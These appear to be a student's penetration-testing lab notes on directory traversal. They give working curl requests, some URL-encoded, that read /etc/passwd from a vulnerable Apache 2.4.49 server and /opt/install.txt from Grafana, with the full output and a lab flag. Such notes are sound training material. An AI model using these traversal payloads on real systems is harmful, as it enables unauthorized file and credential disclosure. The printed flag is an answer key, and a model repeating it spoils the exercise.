# Encoding Special Characters

Using "../" to leverage the Directory Traversal vulnerability in Apache 2.4.49
>``` shell
>kali@kali:~$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
>
># ========== Expected Result ==========
><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
><html><head>
><title>404 Not Found</title>
></head><body>
><h1>Not Found</h1>
><p>The requested URL was not found on this server.</p>
></body></html>
># =====================================
>
>>kali@kali:~$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
>
># ========== Expected Result ==========
><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
><html><head>
><title>404 Not Found</title>
></head><body>
><h1>Not Found</h1>
><p>The requested URL was not found on this server.</p>
></body></html>
># =====================================
>```

Using encoded dots for Directory Traversal
>``` shell
>kali@kali:~$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
>
># ========== Expected Result ==========
>root:x:0:0:root:/root:/bin/bash
>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
>bin:x:2:2:bin:/bin:/usr/sbin/nologin
>sys:x:3:3:sys:/dev:/usr/sbin/nologin
>...
>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
>alfred:x:1000:1000::/home/alfred:/bin/bash
># =====================================
>```

Lab 1 - In this section, we used URL encoding to exploit the directory traversal vulnerability in Apache 2.4.49 on VM #1. Use Burp or curl to display the contents of the /opt/passwords file via directory traversal in the vulnerable Apache web server. Remember to use URL encoding for the directory traversal attack. Find the flag in the output of the file.
>

Lab 2 - Grafana is running on port 3000 on VM #1. The version running is vulnerable to the same directory traversal vulnerability as in the previous section. While URL encoding is not needed to perform a successful directory traversal attack, experiment with URL encoding different characters of your request to display the contents of /etc/passwd. Once you have a working request utilizing URL encoding, obtain the flag by displaying the contents of /opt/install.txt.
>``` shell
># Exploiting Grafana directory traversal to read /opt/install.txt
>kali@kali:~$ curl -v --path-as-is "http://192.168.179.16:3000/public/plugins/alertlist/../../../../../../../../../../../../opt/install.txt"
>
>># ========== Expected Result ==========
>*   Trying 192.168.179.16:3000...
>* Connected to 192.168.179.16 (192.168.179.16) port 3000
>* using HTTP/1.x
>> GET /public/plugins/alertlist/../../../../../../../../../../../../opt/install.txt HTTP/1.1
>> Host: 192.168.179.16:3000
>> User-Agent: curl/8.13.0
>> Accept: */*
>> 
>* Request completely sent off
>< HTTP/1.1 200 OK
>< Accept-Ranges: bytes
>< Cache-Control: no-cache
>< Content-Length: 37
>< Content-Type: text/plain; charset=utf-8
>< Expires: -1
>< Last-Modified: Fri, 31 Oct 2025 18:37:31 GMT
>< Pragma: no-cache
>< X-Content-Type-Options: nosniff
>< X-Frame-Options: deny
>< X-Xss-Protection: 1; mode=block
>< Date: Fri, 31 Oct 2025 19:22:41 GMT
>< 
>OS{6eecdfe0347698362a33150e7a4fcee3}
>* Connection #0 to host 192.168.179.16 left intact
># =====================================
>```
>OS{6eecdfe0347698362a33150e7a4fcee3}
